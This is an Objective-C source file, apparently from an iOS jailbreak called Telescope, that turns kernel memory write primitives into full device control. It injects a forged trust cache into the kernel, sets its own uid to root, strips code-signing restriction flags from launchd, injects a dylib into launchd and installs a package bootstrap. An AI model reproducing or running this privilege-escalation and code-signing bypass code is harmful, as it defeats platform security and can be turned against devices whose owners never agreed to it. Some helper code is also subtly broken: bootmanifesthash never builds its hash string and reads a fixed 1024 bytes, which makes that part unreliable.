//
//  loadtelescoped.m
//  Telescope
//
//  Created by Jonah Butler on 1/15/24.
//

#include "libkfd.h"
#import <UIKit/UIKit.h>
#include <stdint.h>
#include <stdbool.h>
#import <Foundation/Foundation.h>
#include "loadtelescoped.h"
#import "pplrw.h"
#import "IOSurface_Primitives.h"
#import "libkfd/perf.h"
#import "kallocation.h"
#import "../TelescopeBin/_shared/IOKit/IOKitLib.h"
#import <zstd.h>
#import "../TelescopeBin/_shared/xpc/xpc.h"
#import "libarchive/archive.h"
#define SYSTEM_VERSION_LOWER_THAN(v)                ([[[UIDevice currentDevice] systemVersion] compare:v options:NSNumericSearch] == NSOrderedAscending)
#define SYSTEM_VERSION_LESS_THAN_OR_EQUAL_TO(v)     ([[[UIDevice currentDevice] systemVersion] compare:v options:NSNumericSearch] != NSOrderedDescending)
#define SYSTEM_VERSION_EQUAL_TO(v)                  ([[[UIDevice currentDevice] systemVersion] compare:v options:NSNumericSearch] == NSOrderedSame)
#define SYSTEM_VERSION_GREATER_THAN_OR_EQUAL_TO(v)  ([[[UIDevice currentDevice] systemVersion] compare:v options:NSNumericSearch] != NSOrderedAscending)
// Thanks KpwnZ for the launchd stuff here.
#define ROUTINE_LOAD 800
#define ROUTINE_UNLOAD 801
typedef UInt32 IOOptionBits;
#define IO_OBJECT_NULL ((io_object_t)0)
typedef mach_port_t io_object_t;
typedef io_object_t io_registry_entry_t;
extern const mach_port_t kIOMainPortDefault;
typedef char io_string_t[512];
extern char **environ;

kern_return_t IOObjectRelease(io_object_t object);

io_registry_entry_t IORegistryEntryFromPath(mach_port_t, const io_string_t);

CFTypeRef IORegistryEntryCreateCFProperty(io_registry_entry_t entry,
                                          CFStringRef key,
                                          CFAllocatorRef allocator,
                                          IOOptionBits options);
#define BOOT_INFO_PATH prebootPath(@"baseboin/boot_info.plist")

extern void AppendLog(NSString *format, ...) ;

NSString *prebootPath(NSString *path) {
    static NSString *sPrebootPrefix = nil;
    static dispatch_once_t onceToken;
    dispatch_once(&onceToken,^{
        NSMutableString *bootManifestHashStr;
        io_registry_entry_t registryEntry = IORegistryEntryFromPath(kIOMainPortDefault, "IODeviceTree:/chosen");
        if(registryEntry) {
            CFDataRef bootManifestHash = (CFDataRef)IORegistryEntryCreateCFProperty(registryEntry, CFSTR("boot-manifest-hash"), kCFAllocatorDefault, 0);
            if(bootManifestHash) {
                const UInt8 *buffer = CFDataGetBytePtr(bootManifestHash);
                bootManifestHashStr = [NSMutableString stringWithCapacity:(CFDataGetLength(bootManifestHash) *2)];
                for(CFIndex i = 0; i < CFDataGetLength(bootManifestHash); i++) {
                    [bootManifestHashStr appendFormat:@"%02X",buffer[i]];
                }
                CFRelease(bootManifestHash);
            }
            if(bootManifestHashStr) {
                NSString *activePrebootPath = [@"/private/preboot/" stringByAppendingPathComponent:bootManifestHashStr];
                NSArray *subItems = [[NSFileManager defaultManager] contentsOfDirectoryAtPath:activePrebootPath error:nil];
                for(NSString *subItem in subItems) {
                    if([subItem hasPrefix:@"jb-"]) {
                        sPrebootPrefix = [[activePrebootPath stringByAppendingPathComponent:subItem] stringByAppendingPathComponent:@"procursus"];
                        break;
                    }
                }

            } else {
                sPrebootPrefix = @"/var/jb";
            }
        }
    });
    if(path) {
        return [sPrebootPrefix stringByAppendingPathComponent:path];
    } else {
        return sPrebootPrefix;
    }
}
struct _os_alloc_once_s {
  long once;
  void *ptr;
};

struct xpc_global_data {
  uint64_t a;
  uint64_t xpc_flags;
  mach_port_t task_bootstrap_port; /* 0x10 */
#ifndef _64
  uint32_t padding;
#endif
  xpc_object_t xpc_bootstrap_pipe; /* 0x18 */
  // and there's more, but you'll have to wait for MOXiI 2 for those...
  // ...
};

extern struct _os_alloc_once_s _os_alloc_once_table[];
extern void *_os_alloc_once(struct _os_alloc_once_s *slot, size_t sz,
                            os_function_t init);

xpc_object_t launchd_xpc_send_message(xpc_object_t xdict) {
  void *pipePtr = NULL;

  if (_os_alloc_once_table[1].once == -1) {
    pipePtr = _os_alloc_once_table[1].ptr;
  } else {
    pipePtr = _os_alloc_once(&_os_alloc_once_table[1], 472, NULL);
    if (!pipePtr)
      _os_alloc_once_table[1].once = -1;
  }

  xpc_object_t xreply = nil;
  if (pipePtr) {
    struct xpc_global_data *globalData = pipePtr;
    xpc_object_t pipe = xpc_pipe_create_from_port(bootstrap_port, 4);
    if (pipe) {
      int err = xpc_pipe_routine(pipe, xdict, &xreply);
      if (err != 0) {
        AppendLog(@"Error on sending message to launchd! %s",xpc_strerror(err));
          usleep(500);
        return nil;
      }
    }
  }
  return xreply;
}

int64_t launchctl_load(const char *plistPath, bool unload) {
  xpc_object_t pathArray = xpc_array_create_empty();
  xpc_array_set_string(pathArray, XPC_ARRAY_APPEND, plistPath);

  xpc_object_t msgDictionary = xpc_dictionary_create_empty();
  xpc_dictionary_set_uint64(msgDictionary, "subsystem", 3);
  xpc_dictionary_set_uint64(msgDictionary, "handle", 0);
  xpc_dictionary_set_uint64(msgDictionary, "type", 1);
  xpc_dictionary_set_bool(msgDictionary, "legacy-load", true);
  xpc_dictionary_set_bool(msgDictionary, "enable", false);
  xpc_dictionary_set_uint64(msgDictionary, "routine",
                            unload ? ROUTINE_UNLOAD : ROUTINE_LOAD);
  xpc_dictionary_set_value(msgDictionary, "paths", pathArray);

  xpc_object_t msgReply = launchd_xpc_send_message(msgDictionary);

  char *msgReplyDescription = xpc_copy_description(msgReply);
  AppendLog(@"[jbinit] msgReply = %s\n", msgReplyDescription);
  free(msgReplyDescription);

  int64_t bootstrapError =
      xpc_dictionary_get_int64(msgReply, "bootstrap-error");
  if (bootstrapError != 0) {
    AppendLog(@"[jbinit] bootstrap-error = %s\n",
          xpc_strerror((int32_t)bootstrapError));
    return bootstrapError;
  }

  int64_t error = xpc_dictionary_get_int64(msgReply, "error");
  if (error != 0) {
    AppendLog(@"[jbinit]error = %s\n", xpc_strerror((int32_t)error));
    return error;
  }

  // launchctl seems to do extra things here
  // like getting the audit token via xpc_dictionary_get_audit_token
  // or sometimes also getting msgReply["req_pid"] and msgReply["rec_execcnt"]
  // but we don't really care about that here

  return 0;
}
objcbridge *theobjcbridge;
extern int spawnRoot(NSString* path, NSArray* args, NSString** stdOut, NSString** stdErr); // this gives me the heebeejeebees (or however the fuck you spell it)
extern int userspaceReboot(void);

size_t kwritebuf_tcinject(uint64_t where, const void *p, size_t size) {
    size_t remainder = size % 8;
    if (remainder == 0)
        remainder = 8;
    size_t tmpSz = size + (8 - remainder);
    if (size == 0)
        tmpSz = 0;

    uint64_t *dstBuf = (uint64_t *)p;
    size_t alignedSize = (size & ~0b111);

    for (int i = 0; i < alignedSize; i+=8){
        kwrite64_kfd(where + i, dstBuf[i/8]);
    }
    if (size > alignedSize) {
        uint64_t val = kread64_kfd(where + alignedSize);
        memcpy(&val, ((uint8_t*)p) + alignedSize, size-alignedSize);
        kwrite64_kfd(where + alignedSize, val);
    }
    return size;
}
void *alloc(UInt64 size) {
    UInt64 toret = 0;
    vm_allocate(mach_task_self(), &toret, size, VM_FLAGS_ANYWHERE | VM_FLAGS_PERMANENT);
    return (void*)toret;
}
uint64_t loadtc(NSString *path) {
    NSString  *str = path;
    NSData *data = [NSData dataWithContentsOfFile:str];
    theobjcbridge = [[objcbridge alloc] init];
    UInt64 pmap_image4_trust_caches =  [theobjcbridge find_pmap_image4_trust_caches]; //WOOO
    AppendLog(@"Found pmap_image4_trust_caches at %p",pmap_image4_trust_caches);
    sleep(1);
    pmap_image4_trust_caches += get_kernel_slide();
    AppendLog(@"pmap_image4_trust_caches slid: %p", pmap_image4_trust_caches);
    UInt64 alloc_size = sizeof(trustcache_module) + data.length + 0x8;
    void *mem = (void *)[kallocation kallocWithSize:alloc_size];
    void *payload = (void *)[kallocation kallocWithSize:alloc_size];
    if(mem == 0) {
        AppendLog(@"Failed to allocate memory for TrustCache: %p",mem);
        exit(EXIT_FAILURE); // ensure no kpanics
    }
    AppendLog(@"Writing helloworld.tc!");
    if(data == 0x0) {
        AppendLog(@"Something went wrong, no trustcache buffer provided.");
    }
    kwritebuf_tcinject(payload, data.bytes, data.length);
    AppendLog(@"Wrote basebin.tc!");
    sleep(1);
    AppendLog(@"Writing payload!");
    kwrite64_kfd(mem + offsetof(trustcache_module, fileptr), payload);
    AppendLog(@"Wrote payload!");
    sleep(1);
    AppendLog(@"Writing length!");
    UInt64 len = data.length;
    kwrite64_kfd(mem + offsetof(trustcache_module, module_size),len);
    AppendLog(@"Wrote length!");
    sleep(1);
    UInt64 trustcache = kread64_ptr_kfd(pmap_image4_trust_caches);
    AppendLog(@"Beginning trustcache insertion!: trustcache gave: %p",trustcache);
    if(!trustcache) {
        dma_perform(^{
            dma_writevirt64(pmap_image4_trust_caches, mem);
        });
        AppendLog(@"Trustcache didn't already exist, write our stuff directly, and skip to end.");
        goto done;
    }
    UInt64 prev = 0;
    AppendLog(@"Entering while(trustcache)!");
    sleep(1);
    while(trustcache) {
        prev = trustcache;
        trustcache = kread64_ptr_kfd(trustcache);
    }
    AppendLog(@"Final trustcache addr: %p",prev);
    sleep(1);
    sleep(1);
    AppendLog(@"memkaddr: %p", mem);
    sleep(1);
    AppendLog(@"Entering dma_perform!");
    sleep(1);
    dma_perform(^{
        AppendLog(@"Entered dma_perform!");
        dma_writevirt64(prev, mem);
        kwrite64_kfd(mem+8, prev);
        AppendLog(@"Did write!");
    });
done:
    sleep(1);
    AppendLog(@"TrustCache Successfully loaded!");
    return (uint64_t)mem;
}
NSString *bootmanifesthash(void) {
    io_registry_entry_t entry = IORegistryEntryFromPath(kIOMasterPortDefault, "IODeviceTree:/chosen");
    if(entry == MACH_PORT_NULL) {
        return @"";
    }
    CFTypeRef hash = IORegistryEntryCreateCFProperty(entry, CFSTR("boot-manifest-hash"), kCFAllocatorDefault, 0);
    NSData *data = (__bridge NSData*)hash;
    NSString *ret = @"";
    const unsigned char *bytes = [data bytes];
    for(int i = 0; i < 1024; i++) {
        NSString *toappend = [NSString stringWithFormat:@"%02X",bytes[i]];
    }
    return ret;
}
NSString *locateexistingfakeroot(void) {
    NSString *hash = bootmanifesthash();
    if([hash isEqualToString:@""]) {
        return hash;
    }
    NSURL *ppURL = [NSURL fileURLWithPath:[@"/private/preboot/" stringByAppendingString:hash]];
    NSArray<NSURL *> *candidates = [[NSFileManager defaultManager] contentsOfDirectoryAtURL:ppURL includingPropertiesForKeys:nil options:NSDirectoryEnumerationSkipsHiddenFiles error:nil];
    if(candidates == nil) {
        return @"";
    }
    for(NSURL *candidate in candidates.objectEnumerator) {
        if([[candidate lastPathComponent] hasPrefix:@"jb-"]) {
            return [candidate path];
        }
    }
    return @"";
}
NSString *generatefakerootpath(void) {
    const char *letters = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
    char *result = malloc(15*sizeof(char));
    for(int counter = 0; counter < 15; counter++) {
        UInt32 randomindex = arc4random_uniform((UInt32)strlen(letters));
        const char randomchar = letters[randomindex];
        result[counter] = randomchar;
    }
    NSString *toret = [NSString stringWithFormat:@"/private/preboot/%s/jb-%s",[bootmanifesthash() cStringUsingEncoding:NSUTF8StringEncoding],result];
    free(result);
    return toret;
}
void UUIDFixer(void) {
    NSString *path = [@"/private/preboot/" stringByAppendingString:bootmanifesthash()];
    struct stat pathstat;
    if(stat([path cStringUsingEncoding:NSUTF8StringEncoding],&pathstat) != 0) {
        //TODO: THROW ERRORS
        return;
    }
    uid_t curownerid = pathstat.st_uid;
    gid_t curgroupid = pathstat.st_gid;
    if(curownerid != 0 || curgroupid != 0) {
        if(chown([path cStringUsingEncoding:NSUTF8StringEncoding],0,0) != 0) {
            //TODO: THROW ERRORS
            return;
        }
    }
    mode_t perms = pathstat.st_mode & S_IRWXU;
    
    if(perms != 0755) {
        if(chmod([path cStringUsingEncoding:NSUTF8StringEncoding],0755) != 0) {
            // TODO: THROW ERRORS
            return;
        }
    }
}
void bspermfixer(void) {
    NSURL *pathURL = [NSURL fileURLWithPath:@"/var/jb"];
    struct stat pathstat;
    NSFileManager *m = [NSFileManager defaultManager];
    NSDirectoryEnumerator *enumer = [m enumeratorAtURL:pathURL includingPropertiesForKeys:@[NSURLNameKey, NSURLIsDirectoryKey] options:NSDirectoryEnumerationSkipsHiddenFiles errorHandler:nil];
    for(NSURL *url in enumer) {
        NSString *path = [url path];
        if(stat([path cStringUsingEncoding:NSUTF8StringEncoding],&pathstat) != 0) {
            //TODO: THROW ERRORS
            return;
        }
        mode_t perms = pathstat.st_mode & S_IRWXU;
        
        if(perms != 0755) {
            if(chmod([path cStringUsingEncoding:NSUTF8StringEncoding],0755) != 0) {
                // TODO: THROW ERRORS
                return;
            }
        }
    }
}
uint32_t old_uid = 0;
void gimmeRoot(void) {
    uint64_t proc_ro = kread64_ptr_kfd(get_current_proc() + 0x18);
    uint64_t ucreds  = kread64_ptr_kfd(proc_ro + 0x20);
    uint64_t cr_posix_p = ucreds + 0x18;
    old_uid = kread32_kfd(cr_posix_p + 0);
    dma_perform(^{
        dma_writevirt32(cr_posix_p + 0,0x0); // yummy root
    });
}
uint64_t getProc(pid_t pid) {
    uint64_t proc = get_kernel_proc();
    while(true) {
        if(kread32_kfd(proc + 0x60) == pid) {
            return proc;
        }
        proc = kread64_kfd(proc + 0x8);
        if(!proc) {
            return 0;
        }
    }
    return 0;
}
#define CS_DEBUGGED         0x10000000  /* process is currently or has previously been debugged and allowed to run with invalid pages */
void setLaunchdasDebugged(void) {
    uint64_t proc = getProc(1);
    uint64_t proc_ro = kread64_kfd(proc + 0x18);
    uint32_t csflags = kread32_kfd(proc_ro + 0x1c);
    csflags = (csflags | CS_DEBUGGED | CS_GET_TASK_ALLOW) & ~(CS_RESTRICT | CS_HARD | CS_KILL);
    AppendLog(@"Setting launchd as debugged now!");
    sleep(1);
    dma_perform(^{
        dma_writevirt32(proc_ro + 0x1c, csflags);
    });
    AppendLog(@"Set launchd as debugged!");
    sleep(1);
}
void takeRootAway(void) {
    uint64_t proc_ro = kread64_ptr_kfd(get_current_proc() + 0x18);
    uint64_t ucreds  = kread64_ptr_kfd(proc_ro + 0x20);
    uint64_t cr_posix_p = ucreds + 0x18;
    dma_perform(^{
        dma_writevirt32(cr_posix_p + 0,old_uid); // no more root :(
    });
}
void createsymboliclink(NSString *path,NSString *pathdest) {
    NSMutableArray *comps = [NSMutableArray arrayWithArray:[path componentsSeparatedByString:@"/"]];
    [comps removeLastObject];
    NSString *dirpath = [NSString pathWithComponents:comps];
    if(![[NSFileManager defaultManager] fileExistsAtPath:dirpath]) {
        [[NSFileManager defaultManager] createDirectoryAtPath:dirpath withIntermediateDirectories:YES attributes:nil error:nil];
    }
    [[NSFileManager defaultManager] createSymbolicLinkAtPath:path withDestinationPath:pathdest error:nil];
}
void unZSTD(NSString *path, NSString *target) {
    NSData *data = [NSData dataWithContentsOfFile:path];
    UInt64 len = ZSTD_getFrameContentSize(data.bytes, data.length);
    void *decompressed = malloc(len);
    ZSTD_decompress(decompressed, len, data.bytes, data.length);
    NSData *outdata = [NSData dataWithBytes:decompressed length:len];
    [[NSFileManager defaultManager] createFileAtPath:target contents:outdata attributes:nil];
    free(decompressed);
}
bool fileosymlinkexists(NSString *path) {
    NSFileManager *manager = [NSFileManager defaultManager];
    if([manager fileExistsAtPath:path]) {
        return true;
    }
    @try {
        NSDictionary *attr = [manager attributesOfItemAtPath:path error:nil];
        NSFileAttributeType filetype = [attr fileType];
        if(filetype == NSFileTypeSymbolicLink) {
            return true;
        }
    } @catch(NSException* e) {}
    return false;
}
// credit to opa334 for making this function
void patchBaseBinLaunchDaemonPlist(NSString *plistPath)
{
    NSMutableDictionary *plistDict = [NSMutableDictionary dictionaryWithContentsOfFile:plistPath];
    if (plistDict) {
        NSMutableArray *programArguments = ((NSArray *)plistDict[@"ProgramArguments"]).mutableCopy;
        if (programArguments.count >= 1) {
            NSString *pathBefore = programArguments[0];
            if (![pathBefore hasPrefix:@"/private/preboot"]) {
                programArguments[0] = prebootPath(pathBefore);
                plistDict[@"ProgramArguments"] = programArguments.copy;
                [plistDict writeToFile:plistPath atomically:YES];
            }
        }
    }
}
mach_port_t JupiterMachPort(void) {
    mach_port_t outPort = -1;
    kern_return_t kr = bootstrap_look_up(bootstrap_port,"com.soranknives.Jupiter",&outPort);
    if(kr != KERN_SUCCESS)
        return MACH_PORT_NULL;
    return outPort;
}
xpc_object_t sendJupiterMessage(xpc_object_t xdict) {
    xpc_object_t xreply = NULL;
    mach_port_t jbdPort = JupiterMachPort();
    if (jbdPort != -1) {
        xpc_object_t pipe = xpc_pipe_create_from_port(jbdPort, 0);
        if (pipe) {
            int err = xpc_pipe_routine(pipe, xdict, &xreply);
            if (err != 0) {
                printf("xpc_pipe_routine error on sending message to Jupiter: %d / "
                       "%s\n",
                       err, xpc_strerror(err));
                xreply = NULL;
            };
        }
        mach_port_deallocate(mach_task_self(), jbdPort);
    }
    return xreply;
}
// Thanks KpwnZ
int runCommandv(const char *cmd, int argc, const char * const* argv, void (^unrestrict)(pid_t))
{
    pid_t pid;
    posix_spawn_file_actions_t *actions = NULL;
    posix_spawn_file_actions_t actionsStruct;
    int out_pipe[2];
    bool valid_pipe = false;
    posix_spawnattr_t *attr = NULL;
    posix_spawnattr_t attrStruct;

    valid_pipe = pipe(out_pipe) == 0;
    if (valid_pipe && posix_spawn_file_actions_init(&actionsStruct) == 0) {
        actions = &actionsStruct;
        posix_spawn_file_actions_adddup2(actions, out_pipe[1], 1);
        posix_spawn_file_actions_adddup2(actions, out_pipe[1], 2);
        posix_spawn_file_actions_addclose(actions, out_pipe[0]);
        posix_spawn_file_actions_addclose(actions, out_pipe[1]);
    }

    if (unrestrict && posix_spawnattr_init(&attrStruct) == 0) {
        attr = &attrStruct;
        posix_spawnattr_setflags(attr, POSIX_SPAWN_START_SUSPENDED);
    }

    int rv = posix_spawn(&pid, cmd, actions, attr, (char *const *)argv, environ);

    if (unrestrict) {
        unrestrict(pid);
        kill(pid, SIGCONT);
    }

    if (valid_pipe) {
        close(out_pipe[1]);
    }

    if (rv == 0) {
        if (valid_pipe) {
            char buf[256];
            ssize_t len;
            while (1) {
                len = read(out_pipe[0], buf, sizeof(buf) - 1);
                if (len == 0) {
                    break;
                }
                else if (len == -1) {
                    perror("posix_spawn, read pipe\n");
                }
                buf[len] = 0;
                NSLog(@"%s\n", buf);
            }
        }
        if (waitpid(pid, &rv, 0) == -1) {
            NSLog(@"ERROR: Waitpid failed\n");
        } else {
            NSLog(@"%s(%d) completed with exit status %d\n", __FUNCTION__, pid, WEXITSTATUS(rv));
        }

    } else {
        NSLog(@"%s(%d): ERROR posix_spawn failed (%d): %s\n", __FUNCTION__, pid, rv, strerror(rv));
        rv <<= 8; // Put error into WEXITSTATUS
    }
    if (valid_pipe) {
        close(out_pipe[0]);
    }
    return rv;
}

int util_runCommand(const char *cmd, ...)
{
    va_list ap, ap2;
    int argc = 1;

    va_start(ap, cmd);
    va_copy(ap2, ap);

    while (va_arg(ap, const char *) != NULL) {
        argc++;
    }
    va_end(ap);

    const char *argv[argc+1];
    argv[0] = cmd;
    for (int i=1; i<argc; i++) {
        argv[i] = va_arg(ap2, const char *);
    }
    va_end(ap2);
    argv[argc] = NULL;

    int rv = runCommandv(cmd, argc, argv, NULL);
    return WEXITSTATUS(rv);
}
void untar(const char *tarpath,const char *target,bool isbs) {
    const char *tarbin = [[[[NSBundle mainBundle]bundlePath] stringByAppendingString:@"/tar"] cStringUsingEncoding:NSUTF8StringEncoding];
    NSLog(@"Untarring to %s",target);
    AppendLog(@"Untarring to %s",target);
    if(isbs) {
        util_runCommand(tarbin,"--strip-components=3","--preserve-permissions","-xf",tarpath,"-C",target,NULL);
    } else {
        util_runCommand(tarbin,"--preserve-permissions","-xf",tarpath,"-C",target,NULL);
    }
    NSLog(@"Untarred!");
    AppendLog(@"Untarred %s",tarpath);
}
void bootstrap(void) {
    //kopen(2,false);
    NSString *basebintc = [[[NSBundle mainBundle] bundlePath] stringByAppendingString:@"/basebin.tc"];
    NSString *tartc = [[[NSBundle mainBundle] bundlePath] stringByAppendingString:@"/tar.tc"];
    uint64_t basebinkaddr = loadtc(basebintc);
    sleep(1);
    //loadtc(tartc);
    //NSString *tarbinzip = [[[NSBundle mainBundle] bundlePath] stringByAppendingString:@"/tar.zip"];
    util_runCommand("/sbin/mount","-u", "-w","/private/preboot",NULL);
    NSFileManager *fileManager = [NSFileManager defaultManager];
    @try {
        NSDictionary *attr = [fileManager attributesOfItemAtPath:@"/var/jb" error:nil];
        NSFileAttributeType filetype = [attr fileType];
        if(filetype == NSFileTypeSymbolicLink) {
            [fileManager removeItemAtPath:@"/var/jb" error:nil];
        }
    } @catch (NSException *exception) {}
    if([fileManager fileExistsAtPath:@"/var/jb"]) {
        [fileManager removeItemAtPath:@"/var/jb" error:nil];
    }
    NSString *fakerootpath = locateexistingfakeroot();
    if([fakerootpath isEqualToString:@""]) {
        fakerootpath = generatefakerootpath();
        [[NSFileManager defaultManager] createDirectoryAtPath:fakerootpath withIntermediateDirectories:YES attributes:nil error:nil];
    }
    bool needtoextractbs = false;
    NSString *procursuspath = [fakerootpath stringByAppendingString:@"/procursus"];
    NSString *installedpath = [fakerootpath stringByAppendingString:@"/.installed_telescope"];
    if([[NSFileManager defaultManager] fileExistsAtPath:procursuspath]) {
        if(![[NSFileManager defaultManager] fileExistsAtPath:installedpath]) {
            [[NSFileManager defaultManager] removeItemAtPath:procursuspath error:nil];
        }
    }
    if(![[NSFileManager defaultManager] fileExistsAtPath:procursuspath]) {
        [[NSFileManager defaultManager] createDirectoryAtPath:procursuspath withIntermediateDirectories:YES attributes:nil error:nil];
        needtoextractbs = true;
    }
    NSString *basebintarpath = [[[NSBundle mainBundle] bundlePath] stringByAppendingString:@"/basebin.tar"];
    NSString *basebinpath = [procursuspath stringByAppendingString:@"/baseboin"];
    if([[NSFileManager defaultManager] fileExistsAtPath:basebinpath]) {
        [[NSFileManager defaultManager] removeItemAtPath:basebinpath error:nil];
    }
    untar([basebintarpath cStringUsingEncoding:NSUTF8StringEncoding],[procursuspath cStringUsingEncoding:NSUTF8StringEncoding],false);
    createsymboliclink(@"/var/jb", procursuspath);
    if(needtoextractbs) {
        NSString *bspath = [[[NSBundle mainBundle] bundlePath] stringByAppendingString:@"/bootstrap-iphoneos-arm64.tar"];
        untar([bspath cStringUsingEncoding:NSUTF8StringEncoding], "/var/jb", true);
        
        //[[NSFileManager defaultManager] removeItemAtPath:bootstraptmptarpath error:nil];
        [@"" writeToFile:installedpath atomically:YES encoding: NSUTF8StringEncoding error:nil];
    }
        NSString *defaultsources = @"Types: deb \
    URIs: https://repo.chariz.com/ \
    Suites: ./ \
    Components: \
        \
    Types: deb \
    URIs: https://havoc.app/ \
    Suites: ./ \
    Components: \
    \
    Types: deb \
    URIs: http://apt.thebigboss.org/repofiles/cydia/ \
    Suites: stable \
    Components: main \
    \
    Types: deb \
    URIs: https://ellekit.space/ \
    Suites: ./ \
    Components:";
        [defaultsources writeToFile:@"/var/jb/etc/apt/sources.list.d/default.sources" atomically:NO encoding:NSUTF8StringEncoding error:nil];
        if(!fileosymlinkexists(@"/var/jb/usr/bin/opainject")) {
            createsymboliclink(@"/var/jb/usr/bin/opainject", [procursuspath stringByAppendingString:@"/baseboin/opainject"]);
            if(![[NSFileManager defaultManager] fileExistsAtPath:@"/var/jb/var/mobile/Library/Preferences"]) {
                NSDictionary *attrs = @{
                    NSFilePosixPermissions: @493,
                    NSFileOwnerAccountID: @501,
                    NSFileGroupOwnerAccountID: @501
                };
                [[NSFileManager defaultManager] createDirectoryAtPath:@"/var/jb/var/mobile/Library/Preferences" withIntermediateDirectories:YES attributes:attrs error:nil];
            }
            NSURL *bootinfoURL = [NSURL fileURLWithPath:@"/var/jb/baseboin/boot_info.plist"];
            NSArray *existingallocs = @[            ];
            NSArray *unusedallocs = @[
                [NSNumber numberWithUnsignedLongLong:[kallocation kallocWithSize:0x4000]],
                [NSNumber numberWithUnsignedLongLong:[kallocation kallocWithSize:0x4000]],
                [NSNumber numberWithUnsignedLongLong:[kallocation kallocWithSize:0x4000]],
            ]; // Prealloc some pages cuz why not
            NSDictionary *boot_infoconts = @{
                @"ptov_table": [NSNumber numberWithUnsignedLongLong:[theobjcbridge find_ptov_table]],
                @"gPhysBase": [NSNumber numberWithUnsignedLongLong:kread64_ptr_kfd([theobjcbridge find_gPhysBase] + get_kernel_slide())],
                @"gPhysSize": [NSNumber numberWithUnsignedLongLong:kread64_ptr_kfd([theobjcbridge find_gPhysSize] + get_kernel_slide())],
                @"gVirtBase": [NSNumber numberWithUnsignedLongLong:kread64_ptr_kfd([theobjcbridge find_gVirtBase] + get_kernel_slide())],
                @"pmap_image4_trust_caches": [NSNumber numberWithUnsignedLongLong:[theobjcbridge find_pmap_image4_trust_caches]],
                @"kernelslide": [NSNumber numberWithUnsignedLongLong:get_kernel_slide()],
                @"trustcache_allocations": existingallocs,
                @"trustcache_unused_allocations": unusedallocs,
                @"physical_ttep": [NSNumber numberWithUnsignedLongLong:((struct kfd*)_kfd)->info.kernel.ttbr[0].pa],
                @"kernel_proc": [NSNumber numberWithUnsignedLongLong:get_kernel_proc()],
                @"physical_tte1": [NSNumber numberWithUnsignedLongLong:((struct kfd*)_kfd)->info.kernel.ttbr[1].pa],
            };
            [boot_infoconts writeToURL:bootinfoURL atomically:YES];
            
    }
}
// This won't work atm as I need to add Jupiter's trustcache functions.
void finbootstrap(void) {
    util_runCommand("/var/jb/bin/sh", "/var/jb/prep_bootstrap.sh",NULL);
    util_runCommand("/var/jb/usr/bin/dpkg", "-i",[[[[NSBundle mainBundle] bundlePath] stringByAppendingString:@"/Sileo.deb"] cStringUsingEncoding:NSUTF8StringEncoding],NULL);
}
/*
void handoff(void) {
    xpc_object_t msg;
    xpc_object_t reply;
    uint64_t gPhysBase = kread64_kfd(kaddr_gPhysBase);
    uint64_t gPhysBasePage = gPhysBase & ~PAGE_MASK;
    uint64_t gPhysSize = kread64_kfd(kaddr_gPhysSize);
    for(uint64_t page = gPhysBasePage; page < ((gPhysBase + gPhysSize) & ~PAGE_MASK); page += 0x4000) {
        msg = xpc_dictionary_create_empty();
        xpc_dictionary_set_uint64(msg, "id", 10);
        mach_port_t port = IOSurface_map_forhandoff(page, gPhysSize);
        xpc_dictionary_set_uint64(msg, "port", (uint64_t)port);
        xpc_dictionary_set_uint64(msg, "page", page);
        reply = sendJupiterMessage(msg);
        if(!reply) {
            AppendLog(@"Failed to send jupiter handoff message.");
            kclose(_kfd);
            exit(EXIT_FAILURE);
        }
    }
    AppendLog(@"Successfully handed PPLRW to Jupiter!");
}
 */
void jb(void) {
    gimmeRoot();
    setenv("PATH", "/sbin:/bin:/usr/sbin:/usr/bin:/var/jb/sbin:/var/jb/bin:/var/jb/usr/sbin:/var/jb/usr/bin", 1);
    setenv("TERM","xterm-256color",1);
    bootstrap();
    NSLog(@"Extracted boostrap!");
    AppendLog(@"Extracted bootstrap!");
    bspermfixer();
    NSLog(@"Fixed bootstrap permissions!");
    AppendLog(@"Fixed bootstrap permissions!");
    setLaunchdasDebugged();
    kclose(_kfd);
    sleep(2);
    /*
    mach_port_t task;
    kern_return_t kr = task_for_pid(mach_task_self(), 1, &task);
    if(kr != KERN_SUCCESS) {
        AppendLog(@"Failed to get launchd task.");
        exit(EXIT_FAILURE);
    }
    task_set_exception_ports(task, EXC_MASK_ALL, MACH_PORT_NULL change , EXCEPTION_STATE, ARM_THREAD_STATE64);
    */
    util_runCommand("/var/jb/baseboin/opainject","1","/var/jb/baseboin/Jupiter.dylib",NULL);
    //util_runCommand([prebootPath(@"baseboin/Jupiter") cStringUsingEncoding:NSUTF8StringEncoding],"");
    NSLog(@"Loaded Jupiter!");
    xpc_object_t message;
    xpc_object_t reply;
    message = xpc_dictionary_create_empty();
    xpc_dictionary_set_bool(message, "JAILBREAK", true);
    xpc_dictionary_set_uint64(message, "id", 11);
    xpc_dictionary_set_uint64(message, "subsystem", 3);
    xpc_dictionary_set_uint64(message, "handle", 0);
    int failcount = 0;
tryagain:
    reply = launchd_xpc_send_message(message);
    if(!reply) {
        if(failcount >= 15) {
            return; // give up.
        }
        AppendLog(@"Failed to kopen in launchd, try again...");
        usleep(500);
        failcount++;
        goto tryagain;
    }
    //handoff();
    /*
    xpc_object_t message;
    xpc_object_t reply;
    message = xpc_dictionary_create_empty();
    xpc_dictionary_set_uint64(message, "id", 1);
    while(!reply) {
        reply = sendJupiterMessage(message);
        usleep(500);
    }
    message = xpc_dictionary_create_empty();
    xpc_dictionary_set_uint64(message, "id", 9);
    reply = sendJupiterMessage(message); // Tell Jupiter to rebuild trustcache.
    if(!reply) {
        NSLog(@"Failed to send Jupiter the message to rebuild trustcache.");
        return;
    }
    
    if([[NSFileManager defaultManager] fileExistsAtPath:@"/var/jb/prep_bootstrap.sh"]) {
        finbootstrap();
    }
    takeRootAway();
    kclose(_kfd);
     */
}

UInt64 helloworldtest(void) {
    spawnRoot(@"/var/mobile/helloworldunsigned", @[], NULL, NULL);
    return 1;
}

UInt64 testKalloc(void) {
    UInt64 ret = [kallocation kallocWithSize:0x100];
    NSLog(@"Kalloc'ed to %p",(void *)ret);
    [kallocation kfreeWithWhereis:ret];
    return ret;
}
